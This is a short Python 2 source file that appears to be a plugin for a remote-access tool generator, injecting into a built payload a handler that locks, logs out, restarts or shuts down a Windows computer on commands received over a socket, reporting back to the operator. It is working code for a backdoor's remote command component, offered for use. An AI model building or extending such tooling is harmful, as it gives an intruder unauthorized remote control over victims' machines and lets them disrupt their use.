# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from ctypes import windll')
        config.import_statements.append('import os')
        config.functions.append('''
def system_stat(option):
    if option == 'lock':
        s.sendall('[*]Locking user...')
        windll.user32.LockWorkStation()
    elif option == 'logout':
        s.sendall('[*]Logging user out...')
        os.system('shutdown /l')
    elif option == 'restart':
        s.sendall('[*]System shutting down...')
        os.system('shutdown /r /t 0')
    elif option == 'shutdown':
        s.sendall('[*]System shutting down...')
        os.system('shutdown /s /t 0')''')
        config.logics.append('''
            elif command in ('lock','logout','restart','shutdown'):
                system_stat(command)''')
    elif option == 'info':
        print '\nName             : System status changer component' \
              '\nOS               : Windows' \
              '\nRequired Modules : os, ctypes' \
              '\nCommands         : lock, logout, restart, shutdown' \
              '\nDescription      : Allows you to gracefully lock, logout, restart or shutdown a computer\n'
